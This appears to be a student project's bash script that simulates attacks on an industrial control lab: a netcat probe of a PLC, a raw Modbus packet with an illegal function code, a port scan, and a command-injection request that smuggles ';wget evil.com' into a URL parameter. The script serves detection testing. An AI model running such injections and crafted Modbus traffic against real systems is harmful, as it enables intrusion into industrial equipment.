#!/bin/bash
# FYP Attack Simulation Demo - WITH TIMEOUTS

echo "==================================="
echo "OT SECURITY ATTACK SIMULATION DEMO"
echo "==================================="

echo "1. Simulating External PLC Access..."
timeout 3 nc -zv 192.168.0.103 1502 || echo "   [⚠] PLC not reachable - skipping"

echo "2. Simulating Modbus Illegal Function..."
echo -e "\x00\x01\x00\x00\x00\x06\x01\x5a\x00\x00\x00\x01" | timeout 3 nc -u 192.168.0.103 502 || echo "   [⚠] Modbus target not reachable"

echo "3. Simulating Command Injection..."
timeout 3 curl -s "http://172.20.96.57:8090/command?cmd=;wget%20evil.com" || echo "   [⚠] OT Puller not reachable"

echo "4. Simulating Port Scan..."
timeout 5 nmap -p 5800 192.168.0.103 || echo "   [⚠] Port scan failed"

echo "✅ Attack simulation completed (with errors)"

